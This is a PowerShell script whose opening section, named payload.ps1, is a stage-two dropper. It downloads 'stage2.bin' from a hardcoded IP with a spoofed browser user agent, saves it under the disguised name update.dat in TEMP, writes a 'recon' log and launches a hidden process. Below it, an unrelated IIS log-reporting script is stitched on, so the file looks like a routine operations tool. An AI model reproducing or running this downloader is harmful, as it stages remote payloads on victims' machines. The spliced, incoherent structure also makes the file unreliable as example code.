
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://203.0.113.143/stage2.bin',
    [string]$PayloadPath = "$env:TEMP\update.dat",
    [string]$ActivityLog = "$env:TEMP\recon.log",
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TransferTimeout = 163,
    [int]$RetryCount = 2,
    [int]$RetryDelay = 6
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 2,
        [int]$RetryDelay = 6,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

Write-StageLog -Message "Starting stage 2 download"
$ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TransferUrl
$OperationResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $PayloadPath -RetryCount $RetryCount -RetryDelay $RetryDelay -UserAgent $RequestAgent
if ($OperationResult) {
    Write-StageLog -Message "Stage 2 downloaded"
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
}
else {
    Write-Warning "Stage 2 transfer did not complete"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TransferUrl
    Destination = $PayloadPath
    RetryCount = $RetryCount
    TimeoutSec = $TransferTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Validating result"
Write-Verbose "Retry budget remaining"
Write-Verbose "Inspecting process list"
Write-Verbose "Operation completed"
Write-Verbose "Reading configuration values"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Stage handoff finished"
Write-Verbose "Checking local path"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$LogRoot = "C:\inetpub\logs\LogFiles\W3SVC1"
$Days = 14
$TopN = 10
$OutputPath = 'D:\Ops\reports\iis-top-2026-09-10.csv'
$HtmlPath = "C:\Reports\iis-2026-09-10.html"


$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$slowest = $entries | Sort-Object -Property TimeTaken -Descending |
    Select-Object -First $TopN Uri, TimeTaken, Status
$topUrls | Export-Csv -Path $OutputPath -NoTypeInformation

$byStatus | Export-Csv -Path $OutputPath.Replace('.csv', '-status.csv') -NoTypeInformation -Encoding UTF8
$slowest | Export-Csv -Path $OutputPath.Replace('.csv', '-slow.csv') -NoTypeInformation

$byDay = $entries | Group-Object -Property Date | Sort-Object -Property Name |
    ForEach-Object {
        [pscustomobject]@{
            Date     = $_.Name
            Requests = $_.Count
            Errors   = @($_.Group | Where-Object { $_.Status -ge 400 }).Count
        }
    }
$byDay | Format-Table -AutoSize

$notFound = $entries | Where-Object { $_.Status -eq 404 } |
    Group-Object -Property Uri | Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$notFound | Export-Csv -Path $OutputPath.Replace('.csv', '-404.csv') -NoTypeInformation -Encoding UTF8

$byHour = $entries | Group-Object -Property { ($_.Time -split ':')[0] } |
    Sort-Object -Property Name
$byHour | ForEach-Object {
    Write-Verbose ("Hour {0}: {1} requests" -f $_.Name, $_.Count)
}
$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byDay | ConvertTo-Html -Title 'IIS traffic by day' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$MailTo = 'webops@contoso.com'
$MailFrom = 'iis-report@contoso.com'
$summaryBody = $byStatus | ConvertTo-Html -Fragment | Out-String

Send-MailMessage -To $MailTo -From $MailFrom -Subject "IIS log summary" `
    -Body $summaryBody -SmtpServer "smtp.contoso.com" -Port 587 -UseSsl
foreach ($log in $logFiles) {
    $sizeMB = [math]::Round($log.Length / 1MB, 2)
    Write-Verbose ("{0}: {1} MB" -f $log.Name, $sizeMB)
}
Write-Host ("Top URL: {0} ({1} hits)" -f $topUrls[0].Uri, $topUrls[0].Count) -ForegroundColor Green
Write-Verbose ("Log files processed: {0}" -f @($logFiles).Count)

$byMethod = $entries | Group-Object -Property Method | Sort-Object -Property Count -Descending
$byMethod | Format-Table Name, Count -AutoSize

$medianTime = ($entries | Measure-Object -Property TimeTaken -Average).Average
Write-Verbose ("Average time taken: {0:N1} ms" -f $medianTime)

$bots = $entries | Where-Object { $_.Uri -match 'robots|sitemap' }
Write-Verbose ("Crawler requests: {0}" -f @($bots).Count)

$errorRate = [math]::Round((@($errorEntries).Count / $totalRequests) * 100, 2)
Write-Host ("Error rate: {0} percent" -f $errorRate) -ForegroundColor Yellow

$bigResponses = $entries | Sort-Object -Property Bytes -Descending | Select-Object -First 5
$bigResponses | Format-Table Uri, Bytes, Status -AutoSize

$compressed = @(Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }).Count
Write-Verbose ("Logs older than 30 days: {0}" -f $compressed)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)
